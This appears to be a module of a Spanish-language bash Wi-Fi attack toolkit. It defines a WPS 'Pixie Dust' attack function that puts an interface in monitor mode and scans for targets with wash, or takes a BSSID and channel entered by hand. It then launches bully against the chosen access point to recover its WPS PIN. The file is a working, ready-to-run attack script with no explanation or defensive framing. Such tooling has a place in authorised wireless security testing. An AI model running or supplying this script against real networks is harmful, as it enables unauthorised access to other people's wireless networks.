#!/bin/bash

# ==============================================================================
# ATTACKS: WPS
# ==============================================================================

function wps_attack() {
    banner
    ensure_mon_interface

    echo -e "${YELLOW}[*] Ataque WPS (Pixie Dust)${NC}"

    # Escaneo Modular (modo wash)
    start_scan_and_selection "wash"
    if [ $? -eq 0 ]; then
        bssid="$TARGET_BSSID"
        channel="$TARGET_CHANNEL"
    else
        echo -e "${YELLOW}[!] Pasando a modo manual...${NC}"
        read -p "Ingresa el BSSID del objetivo: " bssid
        read -p "Ingresa el Canal (CH): " channel
    fi
    
    echo -e "${YELLOW}[*] Iniciando ataque con Bully...${NC}"
    bully -b "$bssid" -c "$channel" -d -v 3 "$mon_interface"
    
    read -p "Presiona Enter para continuar..."
}
